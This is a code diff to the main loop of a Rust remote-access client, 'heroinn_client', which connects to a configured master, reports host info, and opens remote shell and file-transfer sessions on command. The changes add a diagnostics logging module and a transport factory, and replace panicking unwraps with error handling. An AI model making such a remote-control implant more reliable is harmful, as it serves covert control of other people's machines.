@@ -4,7 +4,7 @@ use heroinn_util::{
     cur_timestamp_secs,
     dna::CONNECTION_INFO_FLAG,
     packet::{Heartbeat, HostInfo, Message},
-    protocol::Transport,
+    protocol::{Transport, TransportFactory},
     session::{ClientSession, SessionBase, SessionManager},
 };
 use std::{
@@ -16,6 +16,7 @@ use systemstat::{Ipv4Addr, Platform, System};
 use uuid::Uuid;
 
 mod config;
+mod diagnostics;
 mod module;
 
 use module::{shell::ShellClient, transfer};
@@ -32,23 +33,8 @@ static G_CONNECTION_INFO: SlaveDNA = SlaveDNA {
 static G_DNA: &SlaveDNA = &G_CONNECTION_INFO;
 
 fn main() {
-    #[cfg(debug_assertions)]
-    {
-        simplelog::CombinedLogger::init(vec![
-            simplelog::TermLogger::new(
-                log::LevelFilter::Warn,
-                simplelog::Config::default(),
-                simplelog::TerminalMode::Mixed,
-                simplelog::ColorChoice::Auto,
-            ),
-            simplelog::WriteLogger::new(
-                log::LevelFilter::Info,
-                simplelog::Config::default(),
-                std::fs::File::create("my_rust_binary.log").unwrap(),
-            ),
-        ])
-        .unwrap();
-    }
+    let _ = diagnostics::init_logging();
+    log::info!("heroinn_client starting");
 
     let clientid = Uuid::new_v4().to_string();
 
@@ -60,19 +46,22 @@ fn main() {
 
     let shell_session_mgr_1 = shell_session_mgr.clone();
     let ftp_session_mgr_1 = ftp_session_mgr.clone();
-    std::thread::spawn(move || loop {
-        std::thread::sleep(Duration::from_secs(HEART_BEAT_TIME));
-        let mut shell_session = shell_session_mgr_1.lock().unwrap();
-        let mut ftp_session = ftp_session_mgr_1.lock().unwrap();
+    std::thread::spawn(move || {
+        loop {
+            std::thread::sleep(Duration::from_secs(HEART_BEAT_TIME));
+            let mut shell_session = shell_session_mgr_1.lock().unwrap();
+            let mut ftp_session = ftp_session_mgr_1.lock().unwrap();
 
-        log::info!("shell session : {}", shell_session.count());
-        log::info!("ftp session : {}", ftp_session.count());
+            log::info!("shell session : {}", shell_session.count());
+            log::info!("ftp session : {}", ftp_session.count());
 
-        shell_session.gc();
-        ftp_session.gc();
+            shell_session.gc();
+            ftp_session.gc();
+        }
     });
 
     let config = master_configure();
+    let transport_factory = Arc::new(TransportFactory::system());
 
     log::debug!("master config : {:?}", config);
 
@@ -90,14 +79,20 @@ fn main() {
             }
         };
 
-        let mut client = match Transport::connect(&proto, &config.address) {
-            Ok(p) => p,
-            Err(e) => {
-                log::info!("connect failed : {}", e);
-                std::thread::sleep(Duration::from_secs(5));
-                continue;
-            }
-        };
+        log::info!(
+            "connecting protocol={} target={}",
+            config.protocol,
+            config.address
+        );
+        let mut client =
+            match Transport::connect_with_factory(&transport_factory, &proto, &config.address) {
+                Ok(p) => p,
+                Err(e) => {
+                    diagnostics::report_connect_failure(&e);
+                    std::thread::sleep(Duration::from_secs(5));
+                    continue;
+                }
+            };
 
         log::info!("connect success!");
 
@@ -143,7 +138,11 @@ fn main() {
         };
 
         if let Err(e) = transfer::send(&mut client, &buf) {
-            log::error!("send HostInfo packet failed : {}", e);
+            diagnostics::report_data_plane_failure(
+                "main_connection_send_host_info",
+                client.proxy_context(),
+                &e,
+            );
             client.close();
             continue;
         };
@@ -151,21 +150,27 @@ fn main() {
         let (sender, receriver) = channel::<Vec<u8>>();
 
         let mut client_1 = client.clone();
-        std::thread::spawn(move || loop {
-            let buf = match receriver.recv() {
-                Ok(p) => p,
-                Err(e) => {
-                    log::info!("sender channel closed : {}", e);
-                    break;
-                }
-            };
+        std::thread::spawn(move || {
+            loop {
+                let buf = match receriver.recv() {
+                    Ok(p) => p,
+                    Err(e) => {
+                        log::info!("sender channel closed : {}", e);
+                        break;
+                    }
+                };
 
-            if let Err(e) = transfer::send(&mut client_1, &buf) {
-                log::info!("sender channel closed : {}", e);
-                client_1.close();
-                break;
-            };
-            log::info!("id : {} send [{}] bytes", buf[0], buf.len());
+                if let Err(e) = transfer::send(&mut client_1, &buf) {
+                    diagnostics::report_data_plane_failure(
+                        "main_connection_send",
+                        client_1.proxy_context(),
+                        &e,
+                    );
+                    client_1.close();
+                    break;
+                };
+                log::info!("id : {} send [{}] bytes", buf[0], buf.len());
+            }
         });
 
         let mut client_2 = client.clone();
@@ -204,34 +209,40 @@ fn main() {
             client_2.close();
         });
 
-        std::thread::spawn(move || loop {
-            let base = match session_receiver.recv() {
-                Ok(p) => p,
-                Err(e) => {
-                    log::info!("session receiver channel closed : {}", e);
+        std::thread::spawn(move || {
+            loop {
+                let base = match session_receiver.recv() {
+                    Ok(p) => p,
+                    Err(e) => {
+                        log::info!("session receiver channel closed : {}", e);
+                        break;
+                    }
+                };
+
+                let Ok(buf) = Message::build(
+                    HeroinnClientMsgID::SessionPacket.to_u8(),
+                    &base.clientid,
+                    base.packet,
+                ) else {
+                    continue;
+                };
+
+                if let Err(e) = sender.send(buf) {
+                    log::info!("session receiver closed : {}", e);
                     break;
-                }
-            };
-
-            let Ok(buf) = Message::build(
-                HeroinnClientMsgID::SessionPacket.to_u8(),
-                &base.clientid,
-                base.packet,
-            ) else {
-                continue;
-            };
-
-            if let Err(e) = sender.send(buf) {
-                log::info!("session receiver closed : {}", e);
-                break;
-            };
+                };
+            }
         });
 
         loop {
             let buf = match transfer::recv(&mut client) {
                 Ok(buf) => buf,
                 Err(e) => {
-                    log::error!("connection recv failed : {}", e);
+                    diagnostics::report_data_plane_failure(
+                        "main_connection_recv",
+                        client.proxy_context(),
+                        &e,
+                    );
                     client.close();
                     break;
                 }
@@ -242,7 +253,19 @@ fn main() {
                 .first()
                 .and_then(|id| HeroinnServerCommandID::try_from(*id).ok());
 
-            let msg = match Message::new(client.local_addr().unwrap(), proto.clone(), &buf) {
+            let local_addr = match client.local_addr() {
+                Ok(address) => address,
+                Err(e) => {
+                    diagnostics::report_data_plane_failure(
+                        "main_connection_local_addr",
+                        client.proxy_context(),
+                        &e,
+                    );
+                    client.close();
+                    break;
+                }
+            };
+            let msg = match Message::new(local_addr, proto.clone(), &buf) {
                 Ok(p) => p,
                 Err(e) => {
                     log::error!("decode server command failed : {}", e);
@@ -267,28 +290,63 @@ fn main() {
                     }
                 }
                 Some(HeroinnServerCommandID::File) => {
-                    let id = msg.parse_sessionpacket().unwrap().id;
+                    let id = match msg.parse_sessionpacket() {
+                        Ok(packet) => packet.id,
+                        Err(e) => {
+                            log::error!("create ftp session failed : {}", e);
+                            continue;
+                        }
+                    };
 
-                    match FtpClient::new_client(session_sender.clone(), &clientid, &id) {
+                    match FtpClient::new_client_with_factory(
+                        session_sender.clone(),
+                        &clientid,
+                        &id,
+                        transport_factory.clone(),
+                    ) {
                         Ok(session) => ftp_session_mgr.lock().unwrap().register(session),
                         Err(e) => log::error!("create ftp session failed : {}", e),
                     }
                 }
                 Some(HeroinnServerCommandID::SessionPacket) => {
-                    let packet = msg.parse_sessionpacket().unwrap();
+                    let packet = match msg.parse_sessionpacket() {
+                        Ok(packet) => packet,
+                        Err(e) => {
+                            log::error!("decode session packet failed : {}", e);
+                            continue;
+                        }
+                    };
 
                     log::info!("recv session packet [{}] [{}]", packet.id, msg.length());
 
-                    shell_session_mgr
-                        .lock()
-                        .unwrap()
-                        .write(&packet.id, &packet.data)
-                        .unwrap();
-                    ftp_session_mgr
-                        .lock()
-                        .unwrap()
-                        .write(&packet.id, &packet.data)
-                        .unwrap();
+                    let shell_result = {
+                        shell_session_mgr
+                            .lock()
+                            .unwrap()
+                            .write(&packet.id, &packet.data)
+                    };
+                    if let Err(e) = shell_result {
+                        diagnostics::report_data_plane_failure(
+                            "shell_session_write",
+                            client.proxy_context(),
+                            &e,
+                        );
+                        shell_session_mgr.lock().unwrap().close(&packet.id);
+                    }
+                    let ftp_result = {
+                        ftp_session_mgr
+                            .lock()
+                            .unwrap()
+                            .write(&packet.id, &packet.data)
+                    };
+                    if let Err(e) = ftp_result {
+                        diagnostics::report_data_plane_failure(
+                            "ftp_session_write",
+                            client.proxy_context(),
+                            &e,
+                        );
+                        ftp_session_mgr.lock().unwrap().close(&packet.id);
+                    }
                 }
                 Some(HeroinnServerCommandID::SetTransferRate) => {
                     let setting = match msg.parse_transfer_rate() {
